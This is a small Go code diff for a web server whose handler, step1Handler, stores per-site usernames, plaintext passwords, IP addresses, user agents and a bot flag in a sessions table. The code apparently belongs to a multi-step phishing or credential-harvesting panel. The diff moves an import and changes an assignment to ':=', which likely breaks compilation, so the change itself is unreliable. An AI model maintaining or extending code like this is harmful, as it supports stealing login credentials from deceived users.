@@ -18,7 +18,6 @@ import (
 	"runtime"
 	"strings"
 	"sync"
-	"sync/atomic"
 	"time"
 
 	"golang.org/x/time/rate"
@@ -27,6 +26,7 @@ import (
 	"github.com/google/uuid"
 	_ "github.com/mattn/go-sqlite3"
 )
+import "sync/atomic"
 
 type Config struct {
 	Domain           string   `json:"domain"`
@@ -328,7 +328,7 @@ func step1Handler(c *gin.Context) {
 	id := uuid.New().String()
 	ip := getClientIP(c)
 
-	_, err = db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, is_bot, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, 0, ?, 0, ?)`,
+	_, err := db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, is_bot, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, 0, ?, 0, ?)`,
 		id, req.Site, req.Username, req.Password, ip, c.GetHeader("User-Agent"), time.Now().Format(time.RFC3339), time.Now().Format(time.RFC3339))
 	if err != nil {
 		log.Printf("Error inserting session for IP %s: %v", ip, err)
